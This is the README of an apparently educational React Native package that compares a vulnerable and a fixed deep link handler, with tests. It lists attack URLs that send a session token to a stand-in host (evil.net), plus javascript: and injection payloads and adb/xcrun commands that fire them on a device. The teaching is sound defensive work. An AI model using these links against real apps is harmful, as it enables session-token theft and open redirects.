# Deep link handling: vulnerable vs fixed

A standalone TypeScript package containing two React Native deep link handlers
with the same signature and opposite security properties, plus a Jest suite
that **demonstrates** the difference rather than asserting it.

- `src/vulnerable.ts` — parses the link correctly and then trusts it. Six
  numbered bugs, each individually exploitable.
- `src/fixed.ts` — the same feature set behind four explicit allow-lists.
- `src/parseUri.ts` — a correct URI parser **shared by both**, so the contrast
  is about policy, not about who wrote the better regex.
- `src/linking.ts` — the glue to the real `Linking` API from `react-native`.

Verified against `react-native@0.87.1` with the Strict TypeScript API active.

## Run it

```bash
cd examples/deep-link-vulnerable-vs-fixed
npm install --legacy-peer-deps
npx tsc --noEmit
npm test
```

React Native 0.87 requires Node `^22.13.0 || ^24.3.0 || >= 26.0.0`.

## Why a deep link is attacker input

Registering a URL scheme or an associated domain creates an open,
unauthenticated, cross-application entry point into your app:

- **Android** — any app on the device can `startActivity` with an `Intent`
  carrying your scheme. So can any web page the user taps a link on.
- **iOS** — any app can call `UIApplication.open(_:)` with your scheme, and any
  web page can navigate to your universal link.

Nothing in either platform tells you which app sent the URL or whether the user
meant to send it. The URL is a request body from an unauthenticated client.
Validate it like one.

## The threat, concretely

The vulnerable handler supports "log in, then return where you came from", a
requirement every product eventually grows:

```
myapp://auth/callback?next=https://app.example.com/welcome
```

To decide whether `next` is safe it asks whether the string contains the
company's domain:

```ts
if (next.includes('app.example.com')) {
  // treat as ours: attach the session token
}
```

`includes` answers "does this string contain our domain **somewhere**". That is
true for all of these, none of which are ours:

| Attack URL | Real host |
| --- | --- |
| `https://app.example.com.evil.net/collect` | `app.example.com.evil.net` |
| `https://evil.net/?ref=app.example.com` | `evil.net` |
| `https://app.example.com@evil.net/collect` | `evil.net` |

The third is the nastiest: everything before the `@` in an authority is
*userinfo*, a username. The host is `evil.net`. It reads like a first-party URL
to a person and to a substring check, and it is not one.

Because the "ours" branch appends the session token, the exploit is a single
tap:

```
myapp://auth/callback?next=https://app.example.com.evil.net/collect
```

produces

```
https://app.example.com.evil.net/collect?token=SESSION-TOKEN-DO-NOT-LEAK
```

The token is now in an attacker's access log. `src/__tests__/exploits.test.ts`
asserts exactly this, including that the effective host of the resulting URL is
the attacker's.

## The exploits the suite proves

Each one runs the same URL through both handlers.

| # | Attack | Vulnerable does | Fixed does |
| --- | --- | --- | --- |
| 1 | `…?next=https://app.example.com.evil.net/collect` | opens it **with the session token** | rejects: origin not allow-listed |
| 2 | `…?next=https://evil.net/?ref=app.example.com` | opens it **with the session token** | rejects: origin not allow-listed |
| 3 | `…?next=https://app.example.com@evil.net/collect` | opens it **with the session token** | rejects: origin not allow-listed |
| 4 | `…?next=https%3A%2F%2Fevil.example.net%2Fphish` | open redirect | rejects: origin not allow-listed |
| 5 | `…?next=javascript:alert(1)` | hands it to `Linking.openURL` | rejects: `next` must be https |
| 6 | `myapp://admin/users/delete?userId=1` | navigates to `admin/users/delete` | rejects: no such route |
| 7 | `file:///data/data/…/app.db` | treats it as a route | rejects: scheme not allow-listed |
| 8 | `https://app-example.com/profile/42` | navigates | rejects: host not allow-listed |
| 9 | `myapp://settings?debugMenu=true&apiBase=https://evil.net` | forwards every param to the screen | navigates, forwards **nothing** undeclared |
| 10 | `myapp://profile/42' OR 1=1--` | route name contains the payload | rejects: parameter fails its pattern |

Plus a sweep asserting the session token appears in **no** fixed-handler result
for any URL in the corpus, and that it appears in at least one vulnerable one —
so the sweep cannot pass by accident.

`src/__tests__/fixed.test.ts` then proves the fixed handler is still a working
deep link handler. A handler that rejected everything would pass the exploit
tests trivially; these tests show every legitimate link still resolves, on both
the custom scheme and the universal link host, and pin the exact edge of each
allow-list (wrong scheme, non-default port, subdomain, bad parameter shape).

## The fix: four allow-lists

An allow-list, not a deny-list. A deny-list of bad hosts and bad schemes loses
to the next encoding trick; an allow-list does not, because an input the author
never thought about falls off the end and is rejected.

| Allow-list | Closes |
| --- | --- |
| `ALLOWED_SCHEMES` | foreign schemes (`file:`, `intent:`, another app's scheme) |
| `ALLOWED_UNIVERSAL_HOSTS` | look-alike and subdomain hosts, exact match on the **parsed** host |
| `ROUTES` | screens that were never meant to be externally reachable, and parameters of the wrong shape |
| `ALLOWED_RETURN_ORIGINS` | open redirects, on exact `scheme://host[:port]` |

Two rules that do most of the work:

1. **The route name is never taken from the URL.** The URL selects a row in a
   table you wrote; the route name comes from that row. `Profile`, not
   whatever the path said.
2. **The session token is never attached to an outbound URL.** The fixed
   handler accepts a `Session` parameter purely so the two handlers share a
   signature, and never reads it. URLs end up in server logs, `Referer`
   headers and browser history; a bearer token has no business in one.

## Why this does not use the global `URL`

Two reasons specific to React Native 0.87.

1. **There is no type for it.** Under the Strict TypeScript API, `react-native`
   exposes types only via `types_generated/index.d.ts`, and `URL` is not in
   that surface. `@react-native/typescript-config` sets `lib` to a list of
   `es*` entries with no `dom`, so a global `URL` does not type-check either.

2. **React Native's polyfill is partial.** `react-native/Libraries/Blob/URL.js`
   is a regex-based implementation whose `hostname` and `origin` getters are
   anchored on `^https?://`. For a custom-scheme link such as
   `myapp://auth/callback` they return the empty string. A security check
   written against `url.hostname` would compare `''` to your allow-list and
   behave differently in the app than it did in your Node tests — the worst
   possible failure mode for a security control.

So `src/parseUri.ts` parses explicitly, in code you can read, and both handlers
use it.

## Native configuration this assumes

The handlers are pure TypeScript, but a link only reaches them if the platform
is configured to deliver it.

### Android

`android/app/src/main/AndroidManifest.xml`, inside the launcher `<activity>`:

```xml
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="myapp" />
</intent-filter>

<!-- Verified App Links. android:autoVerify="true" requires a matching
     /.well-known/assetlinks.json on the host; without it Android shows a
     disambiguation dialog instead of opening your app. -->
<intent-filter android:autoVerify="true">
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="https" android:host="app.example.com" />
</intent-filter>
```

Keep `ALLOWED_SCHEMES` and `ALLOWED_UNIVERSAL_HOSTS` in `src/fixed.ts` in sync
with these entries. A scheme registered here but missing there is unreachable,
which is the safe direction to fail.

### iOS

`ios/<App>/Info.plist` for the custom scheme:

```xml
<key>CFBundleURLTypes</key>
<array>
  <dict>
    <key>CFBundleURLName</key>
    <string>com.example.app</string>
    <key>CFBundleURLSchemes</key>
    <array><string>myapp</string></array>
  </dict>
</array>
```

Universal links additionally need the Associated Domains capability
(`applinks:app.example.com`) and a matching
`/.well-known/apple-app-site-association` file served from that host.

## Verify it yourself on a device

With the app installed and the native configuration above in place:

```bash
# Android
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://auth/callback?next=https://app.example.com.evil.net/collect" \
  com.example.app

# iOS simulator
xcrun simctl openurl booted \
  "myapp://auth/callback?next=https://app.example.com.evil.net/collect"
```

Point the `next` host at a server you control and watch its access log. With
the vulnerable handler wired up the session token arrives in the query string.
With the fixed handler the `onRejected` callback fires and nothing is opened.

> [!NOTE]
> The commands above have not been run as part of building this example — this
> repository has no Android or iOS toolchain. The Jest suite is the part that
> is reproducible on any machine with `npm test`, and it proves the same
> behaviour at the handler level.

## What this example does not cover

- **Authenticated deep links.** Nothing here proves the *user* intended the
  link. If a link performs a state change, require a confirmation screen or a
  fresh authentication step; do not act on the link alone.
- **`Linking.openURL` beyond scheme validation.** Even an allow-listed https
  URL leaves your app. If it must render in-app, use a `WebView` with
  `originWhitelist` set, not the system browser.
- **The rest of the app.** A validated deep link that lands on a screen which
  then interpolates its params into a `WebView` URI has moved the bug, not
  fixed it.

## File map

```
package.json          jest config, scripts, pinned 0.87 toolchain
tsconfig.json         extends @react-native/typescript-config, plus extra strictness
babel.config.js       babel-jest transform (see the comment for why not ts-jest)
src/types.ts          Session and the DeepLinkAction union both handlers return
src/parseUri.ts       the shared, correct URI parser
src/vulnerable.ts     DO NOT SHIP. Six numbered bugs.
src/fixed.ts          four allow-lists
src/linking.ts        wiring to react-native's Linking (type-checked, not unit-tested)
src/index.ts          public exports
src/__tests__/parseUri.test.ts    parser behaviour the security checks rely on
src/__tests__/exploits.test.ts    the exploits, run through both handlers
src/__tests__/fixed.test.ts       the fixed handler is still a real handler
```
